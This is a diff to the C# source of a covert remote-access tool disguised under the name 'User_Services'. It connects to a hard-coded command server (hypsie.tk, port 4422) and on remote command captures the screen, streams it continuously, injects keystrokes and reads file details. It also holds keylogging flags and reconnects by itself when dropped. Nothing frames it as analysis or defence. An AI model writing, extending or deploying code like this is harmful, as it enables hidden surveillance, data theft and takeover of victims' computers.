@@ -3,23 +3,25 @@ using System.Diagnostics;
 using WebSocketSharp;
 using System.Threading;
 using System.Drawing;
-using System.Net;
 using System.IO;
 using System.Drawing.Imaging;
 using System.Windows.Forms;
 using Emgu.CV;
 using Keystroke.API;
 using System.Runtime.InteropServices;
-using DirectShowLib;
 
 namespace User_Services
 {
     class Program
     {
+        static string ip = "hypsie.tk";
+        static string port = "4422";
         static bool logging = false;
         static bool livelogging = true;
         static bool neverLogged = true;
         static bool neverLiveLogged = true;
+        static bool opened = true;
+        static bool streaming = false;
         static string dir = Environment.CurrentDirectory;
         static string logged = "";
         static string liveCharacter = "";
@@ -60,43 +62,86 @@ namespace User_Services
         public static void connection()
         {
 
-            using (var ws = new WebSocket("ws://154.49.211.230:4422?id=" + makeId() + "&infos=" + name))
+            using (var ws = new WebSocket("ws://" + ip + ":" + port + "?id=" + makeId() + "&infos=" + name))
             {
 
                 ws.OnMessage += (sender, e) =>
                 {
                     String message;
                     message = e.Data;
-
-                    if (message == "screenshot")
+                    if (message.StartsWith("screenshot"))
                     {
                         ws.Send("##MESSAGE##{\"type\":\"info\", \"message\":\"Please wait, generating screenshot...\"}");
+                        int x = int.Parse(message.Split(' ')[1]);
+                        int y = int.Parse(message.Split(' ')[2]);
                         Bitmap memoryImage;
                         memoryImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                         Screen.PrimaryScreen.Bounds.Height);
                         Size s = new Size(memoryImage.Width, memoryImage.Height);
                         Graphics memoryGraphics = Graphics.FromImage(memoryImage);
                         memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
-
+                        Bitmap bmp = new Bitmap(x, y);
+                        Graphics graph = Graphics.FromImage(bmp);
+                        graph.DrawImage(memoryImage, 0, 0, x, y);
                         MemoryStream stream = new MemoryStream();
-                        memoryImage.Save(stream, ImageFormat.Bmp);
+                        bmp.Save(stream, ImageFormat.Bmp);
                         byte[] imageBytes = stream.ToArray();
                         string base64String = Convert.ToBase64String(imageBytes);
                         ws.Send("##SCREENSHOT##" + base64String);
                         ws.Send("hello ##" + dir + "##");
+                    }
+                    else if (message == "stream_stop")
+                    {
+                        streaming = false;
+                        ws.Send("hello ##" + dir + "##");
+                    }
+                    else if (message.StartsWith("STREAM"))
+                    {
+                        int x = int.Parse(message.Split(' ')[1]);
+                        int y = int.Parse(message.Split(' ')[2]);
+                        streaming = true;
+
+                        new Thread(() =>
+                        {
+
+                            while (streaming)
+                            {
+                                Bitmap memoryImage;
+                                memoryImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
+                                Screen.PrimaryScreen.Bounds.Height);
+                                Size s = new Size(memoryImage.Width, memoryImage.Height);
+                                Graphics memoryGraphics = Graphics.FromImage(memoryImage);
+                                memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
+                                Bitmap bmp = new Bitmap(x, y);
+                                Graphics graph = Graphics.FromImage(bmp);
+                                graph.DrawImage(memoryImage, 0, 0, x, y);
+                                MemoryStream stream = new MemoryStream();
+                                bmp.Save(stream, ImageFormat.Bmp);
+                                byte[] imageBytes = stream.ToArray();
+                                string base64String = Convert.ToBase64String(imageBytes);
+                                ws.Send("##STREAMSHOT##" + base64String);
+                                Thread.Sleep(1000);
+                            }
+
+                        }).Start();
+
                     }
                     else if (message.StartsWith("sendkeys"))
                     {
                         var keys = message.Replace("sendkeys ", "");
                         try
                         {
-                            SendKeys.SendWait(keys); 
+                            SendKeys.SendWait(keys);
                         }
                         catch (Exception error)
                         {
                             ws.Send("##ERROR##" + error.ToString().Replace("\"", ""));
                         }
                         ws.Send("hello ##" + dir + "##");
+                    }
+                    else if (message == "CLOSE")
+                    {
+                        opened = false;
                     }
                     else if (message.StartsWith("CD"))
                     {
@@ -111,7 +156,8 @@ namespace User_Services
                                 dir = dir + message.Split(' ')[1];
                             }
 
-                        } else if (Directory.Exists(dir + '/' + message.Split(' ')[1]))
+                        }
+                        else if (Directory.Exists(dir + '/' + message.Split(' ')[1]))
                         {
                             dir = dir + '/' + message.Split(' ')[1];
                         }
@@ -287,7 +333,8 @@ namespace User_Services
                             ws.Send("##FILENAME##" + filepath);
                             ws.Send(info);
                             ws.Send("hello ##" + dir + "##");
-                        } else if (System.IO.File.Exists(dir + filepath))
+                        }
+                        else if (System.IO.File.Exists(dir + filepath))
                         {
                             FileInfo info = new FileInfo(dir + filepath);
                             ws.Send("##FILENAME##" + dir + filepath);
@@ -333,22 +380,28 @@ namespace User_Services
                     }
                 };
                 ws.OnClose += (sender, e) => {
-                    Stopwatch sw = new Stopwatch();
-                    sw.Start();
-                    while (true)
+                    streaming = false;
+                    if (opened)
                     {
-                        if (sw.ElapsedMilliseconds > 2000)
+                        Stopwatch sw = new Stopwatch();
+                        sw.Start();
+                        while (true)
                         {
-                            ws.Connect();
-                            ws.Send("hello ##" + dir + "##");
-                            break;
+                            if (sw.ElapsedMilliseconds > 2000)
+                            {
+                                ws.Connect();
+                                ws.Send("hello ##" + dir + "##");
+                                break;
+                            }
                         }
                     }
                 };
-
-                ws.Connect();
-                ws.Send("hello ##" + dir + "##");
-                new ManualResetEvent(false).WaitOne();
+                if (opened)
+                {
+                    ws.Connect();
+                    ws.Send("hello ##" + dir + "##");
+                    new ManualResetEvent(false).WaitOne();
+                }
 
             }
 
